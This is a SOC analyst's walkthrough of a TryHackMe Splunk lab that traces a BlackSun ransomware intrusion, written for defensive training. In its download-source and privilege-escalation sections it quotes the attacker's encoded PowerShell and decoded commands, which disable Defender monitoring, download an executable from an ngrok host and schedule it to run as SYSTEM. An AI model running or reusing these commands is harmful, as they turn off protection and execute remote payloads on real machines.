# PS Eclipse
## Challenge Description
I'm a SOC Analyst for an MSSP called TryNotHackMe. A customer wants an investigation into events on Keegan's machine from Monday, May 16th, 2022. The client noticed files with strange extensions and is concerned about a possible ransomware attempt. My manager tasked me with reviewing the Splunk logs to determine exactly what happened.

https://tryhackme.com/room/posheclipse

---

## The Malicious Binary
### Notes
* I started the investigation with a broad search to identify the user and workstation. 
* I set the time range from May 16, 2022 to the present to capture the incident window.
* By filtering for Keegan's user account, I reviewed the TargetFilename field in the interesting fields section. 
* I immediately identified a suspicious executable named OUTSTANDING_GUTTER.exe located in the C:\Windows\Temp directory.
* Reviewing the logs and the raw source revealed the file was created on 05/16/22 at 06:33:31 AM.
* I analyzed the process logs and found that this activity was associated with a potential DLL sideloading alert involving mpclient.dll.
* The ProcessID for OUTSTANDING_GUTTER.exe was 9412. I confirmed the connection to the sideloading event by following the process tree and correlating the ProcessID with the malicious image load.
* This confirmed the binary was dropped in a temporary directory and executed using defense evasion techniques.

### Commands & Search Queries
* `index=*` (Filtered for time range 05/16/2022 - Present)
* `index=* User="DESKTOP-TBV8NEF\\keegan"` 
* `index=* User="DESKTOP-TBV8NEF\\keegan" TargetFilename="C:\\Windows\\Temp\\OUTSTANDING_GUTTER.exe"`

### Relevant Photos
* [Search.png](https://github.com/HaydnZK/TCL-Internship/blob/main/Challenges/PS%20Eclipse/01_Question_One_Search.png)
* [TargetFileName.png](https://github.com/HaydnZK/TCL-Internship/blob/main/Challenges/PS%20Eclipse/02_Question_One_TargetFileName.png)
* [Binary.png](https://github.com/HaydnZK/TCL-Internship/blob/main/Challenges/PS%20Eclipse/03_Question_One_Binary.png)
* [PID.png](https://github.com/HaydnZK/TCL-Internship/blob/main/Challenges/PS%20Eclipse/04_Question_One_PID.png)
* [Technique.png](https://github.com/HaydnZK/TCL-Internship/blob/main/Challenges/PS%20Eclipse/05_Question_One_Technique.png)

---

## Download Source & URL
### Notes
* I analyzed the CommandLine field for Keegan's user account and identified a suspicious PowerShell execution involving an encoded command.
* The command included a large Base64 string and the -EncodedCommand flag, which I decoded using CyberChef with the From Base64 and Decode text UTF-16LE (1200) recipes.
* The decoded script revealed that the attacker first disabled Windows Defender Real-time Monitoring.
* The script then used wget to download the malicious binary from a remote ngrok tunnel and scheduled a task to execute it with SYSTEM privileges.
* I identified the download source and defanged the URL for documentation.

### Commands & Search Queries
* `index=* User="DESKTOP-TBV8NEF\\keegan"`
* `index=* User="index=* User="DESKTOP-TBV8NEF\\keegan" CommandLine="powershell.exe  -exec bypass -enc UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBSAGUAYQBsAHQAaQBtAGUATQBvAG4AaQB0AG8AcgBpAG4AZwAgACQAdAByAHUAZQA7AHcAZwBlAHQAIABoAHQAdABwADoALwAvADgAOAA2AGUALQAxADgAMQAtADIAMQA1AC0AMgAxADQALQAzADIALgBuAGcAcgBvAGsALgBpAG8ALwBPAFUAVABTAFQAQQBOAEQASQBOAEcAXwBHAFUAVABUAEUAUgAuAGUAeABlACAALQBPAHUAdABGAGkAbABlACAAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAAXABPAFUAVABTAFQAQQBOAEQASQBOAEcAXwBHAFUAVABUAEUAUgAuAGUAeABlADsAUwBDAEgAVABBAFMASwBTACAALwBDAHIAZQBhAHQAZQAgAC8AVABOACAAIgBPAFUAVABTAFQAQQBOAEQASQBOAEcAXwBHAFUAVABUAEUAUgAuAGUAeABlACIAIAAvAFQAUgAgACIAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAAXABDAE8AVQBUAFMAVABBAE4ARABJAE4ARwBfAEcAVQBUAFQARQBSAC4AZQB4AGUAIgAgAC8AUwBDACAATwBOAEUAVgBFAE4AVAAgAC8ARQBDACAAQQBwAHAAbABpAGMAYQB0AGkAbwBuACAALwBNAE8AIAAqAFsAUwB5AHMAdABlAG0ALwBFAHYAZQBuAHQASQBEAD0ANwA3ADcAXQAgAC8AUgBVACAAIgBTAFkAUwBUAEUATQAiACAALwBmADsAUwBDAEgAVABBAFMASwBTACAALwBSAHUAbgAgAC8AVABOACAAIgBPAFUAVABTAFQAQQBOAEQASQBOAEcAXwBHAFUAVABUAEUAUgAuAGUAeABlACIA"`
* Decoded Command: `Set-MpPreference -DisableRealtimeMonitoring $true;wget http://886e-181-215-214-32.ngrok.io/OUTSTANDING_GUTTER.exe -OutFile C:\Windows\Temp\OUTSTANDING_GUTTER.exe;...`

### Relevant Photos
* [CommandLine.png](https://github.com/HaydnZK/TCL-Internship/blob/main/Challenges/PS%20Eclipse/06_Question_Two_CommandLine.png)
* [ShowSource.png](https://github.com/HaydnZK/TCL-Internship/blob/main/Challenges/PS%20Eclipse/07_Question_Two_ShowSource.png)
* [CyberChef.png](https://github.com/HaydnZK/TCL-Internship/blob/main/Challenges/PS%20Eclipse/08_Question_Two_CyberChef.png)
* [CyberChef_Defang.png](https://github.com/HaydnZK/TCL-Internship/blob/main/Challenges/PS%20Eclipse/09_Question_Two_CyberChef_Defang.png)

---

## Download Execution Tool
### Notes
* I traced the execution chain back from the malicious binary to identify the parent process responsible for the download.
* By following the process tree upwards from OUTSTANDING_GUTTER.exe, I confirmed that powershell.exe was the source of the activity.
* The logs show that PowerShell was used to facilitate the initial foothold and handle the file retrieval on the endpoint.
* This is a common indicator of a living-off-the-land attack where legitimate system tools are leveraged for malicious purposes.

### Commands & Search Queries
* `index=* User="DESKTOP-TBV8NEF\\keegan" process_name="powershell.exe"`
* I also reviewed the process hierarchy in the "show source" view of the initial detection to verify the full path.

### Relevant Photos
* [Binary_Path.png](https://github.com/HaydnZK/TCL-Internship/blob/main/Challenges/PS%20Eclipse/10_Question_Three_Binary_Path.png)

---

## Privilege Escalation Configuration
### Notes
* I identified the privilege escalation mechanism while analyzing the decoded PowerShell command from the previous step.
* The attacker used the `schtasks.exe` utility to create a persistence and escalation mechanism that bypasses standard user controls.
* This specific command creates a new scheduled task named OUTSTANDING_GUTTER.exe. 
* It is configured to trigger on a specific system event (Event ID 777 in the Application log) rather than a traditional time-based schedule.
* By using the `/RU SYSTEM` flag, the attacker ensures that whenever the trigger occurs, the binary executes with SYSTEM-level privileges, effectively escalating from a standard user context to the highest level of access on the Windows host.

### Commands & Search Queries
* `schtasks /Create /TN "OUTSTANDING_GUTTER.exe" /TR "C:\\Windows\\Temp\\COUTSTANDING_GUTTER.exe" /SC ONEVENT /EC Application /MO *[System/EventID=777] /RU "SYSTEM" /f`

### Relevant Photos
* [PE.png](https://github.com/HaydnZK/TCL-Internship/blob/main/Challenges/PS%20Eclipse/11_Question_Four_PE.png)

---

## Permissions & Elevated Command
### Notes
* I identified the specific user context and the exact command line used to execute the binary with elevated privileges.
* While "SYSTEM" represents the permission level, I used the full authority name "NT AUTHORITY" to match the required security context.
* I combined this with the specific execution command found at the end of the attacker's PowerShell script, which manually triggers the scheduled task.
* This command allowed the attacker to bypass the wait time for the Event ID 777 trigger and gain immediate SYSTEM-level access.

### Commands & Search Queries
* I extracted the full command and user context from the decoded PowerShell script:
* Answer: `NT AUTHORITY\"C:\Windows\system32\schtasks.exe" /Run /TN OUTSTANDING_GUTTER.exe`

### Relevant Photos
* [Command.png](https://github.com/HaydnZK/TCL-Internship/blob/main/Challenges/PS%20Eclipse/12_Question_Five_Command.png)

---

## Remote Server Connection
### Notes
* I investigated the network communications of the malicious binary by filtering for activity under the NT AUTHORITY\SYSTEM account.
* I analyzed the DNS activity by reviewing the `QueryName` and `QueryResults` fields in the logs.
* I identified a connection to a different `ngrok` subdomain than the one used for the initial download, which indicates a pivot to a Command and Control (C2) channel.
* This discovery confirms that the binary was actively communicating with an external attacker-controlled infrastructure after gaining elevated privileges.
* I defanged the identified domain for documentation and reporting.

### Commands & Search Queries
* `index=* "OUTSTANDING_GUTTER.exe" User="NT AUTHORITY\\SYSTEM"`
* I reviewed the `QueryName` field within the results to find the active C2 domain.
* Answer: `hxxp[://]9030-181-215-214-32[.]ngrok[.]io`

### Relevant Photos
* [Server.png](https://github.com/HaydnZK/TCL-Internship/blob/main/Challenges/PS%20Eclipse/13_Question_Six_Server.png)
* [Server_Defang.png](https://github.com/HaydnZK/TCL-Internship/blob/main/Challenges/PS%20Eclipse/14_Question_Six_Server_Defang.png)

---

## Secondary PowerShell Script
### Notes
* I conducted a targeted search for file creation events within the `C:\Windows\Temp\` directory to identify secondary payloads.
* By using a `stats` command to aggregate `TargetFilename` counts, I was able to filter out the high-volume noise of legitimate system checks and identify outliers.
* I identified `script.ps1` as the secondary script, noting its presence in the same staging directory as the primary malicious binary.
* The script's creation coincided with the establishment of the C2 connection, marking the transition into the next stage of the attack.

### Commands & Search Queries
* `index=* "temp" | stats count by TargetFilename`
* I narrowed the time range to the specific window of the incident to ensure high-fidelity results.
* Answer: `script.ps1`

### Relevant Photos
* [PS_Script.png](https://github.com/HaydnZK/TCL-Internship/blob/main/Challenges/PS%20Eclipse/15_Question_Seven_PS_Script.png)

---

## The Real Malicious Script
### Notes
* I investigated the true identity of the `script.ps1` file found in the previous step.
* By analyzing the file creation and deletion events (Event Code 11/23), I extracted the MD5/SHA256 hashes for the script.
  * `E5429F2E44990B3D4E249C566FBF19741E671C0E40B809F87248D9EC9114BEF9`
* A search of the hash on VirusTotal confirmed the script is a known PowerShell-based ransomware component.
* While the attacker renamed it `script.ps1` on the victim's machine, its original and widely recognized name is `BlackSun.ps1`.
* I also noted the creation of `blacksun.log` in the same directory, further confirming the presence of the BlackSun ransomware family.

### Commands & Search Queries
* `index=* TargetFilename="C:\\Windows\\Temp\\script.ps1"`
* I identified the hash from the event details and performed a lookup on VirusTotal.
* Answer: `BlackSun.ps1`

### Relevant Photos
* [BlackSun_TargetFilename.png](https://github.com/HaydnZK/TCL-Internship/blob/main/Challenges/PS%20Eclipse/16_Question_Eight_BlackSun_TargetFilename.png)
* [Hash.png](https://github.com/HaydnZK/TCL-Internship/blob/main/Challenges/PS%20Eclipse/17_Question_Eight_Hash.png)
* [VirusTotal.png](https://github.com/HaydnZK/TCL-Internship/blob/main/Challenges/PS%20Eclipse/18_Question_Eight_VirusTotal.png)

---

## Ransomware Note Discovery
### Notes
* I finalized the investigation by identifying the specific ransom note dropped by the BlackSun payload.
* Using a broad keyword search for the malware family name, I located the text file within the user's specific directory structure.
* The note, titled `BlackSun_README.txt`, was placed alongside the encrypted files to provide the victim with recovery instructions.
* The file path confirms that the ransomware successfully targeted the `keegan` user's profile data after the initial compromise.

### Commands & Search Queries
* `index=* "BlackSun"`
* I analyzed the `TargetFilename` field to distinguish between the wallpaper artifact and the text-based ransom note.
* Answer: `C:\Users\keegan\Downloads\vasg6b0wmw029hd\BlackSun_README.txt`

### Relevant Photos
* [Ransom_Note.png](https://github.com/HaydnZK/TCL-Internship/blob/main/Challenges/PS%20Eclipse/19_Question_Nine_Ransom_Note.png)

---

## Wallpaper Persistence & IOCs
### Notes
* I conducted a broad search for "BlackSun" across the logs to identify any remaining Indicators of Compromise (IOCs) or artifacts left by the ransomware.
* I identified a malicious image file, `blacksun.jpg`, located in the `C:\Users\Public\Pictures\` directory.
* This file serves as the desktop wallpaper used by the ransomware to notify the victim that their files have been encrypted.
* Identifying these files in public directories is crucial for full remediation, as they are often used as persistent visual indicators of the attack.

### Commands & Search Queries
* `index=* "BlackSun"`
* Found `TargetFilename: C:\Users\Public\Pictures\blacksun.jpg`
* Answer: `C:\Users\Public\Pictures\blacksun.jpg`

### Relevant Photos
* [Ransom_JPG.png](https://github.com/HaydnZK/TCL-Internship/blob/main/Challenges/PS%20Eclipse/20_Question_Ten_Ransom_JPG.png)
